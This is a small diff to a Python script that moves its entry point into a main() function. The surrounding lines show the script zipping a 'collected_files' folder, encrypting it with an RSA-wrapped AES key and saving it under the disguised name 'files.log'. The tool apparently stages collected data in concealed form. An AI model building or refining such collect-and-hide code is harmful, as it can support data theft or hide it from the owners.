@@ -34,7 +34,7 @@ def encrypt_key_with_rsa(aes_key, public_key_file):
     with open("key.bin", "wb") as f:
         f.write(encrypted_key)
 
-if __name__ == "__main__":
+def main():
     # Step 1: Zip the folder
     zip_path = "collected.zip"
     zip_folder("collected_files", zip_path)
@@ -51,3 +51,6 @@ if __name__ == "__main__":
     # Step 5: Clean up
     os.remove(zip_path)
     print("Encryption complete. Encrypted output saved as 'files.log'.")
+
+if __name__ == "__main__":
+    main()
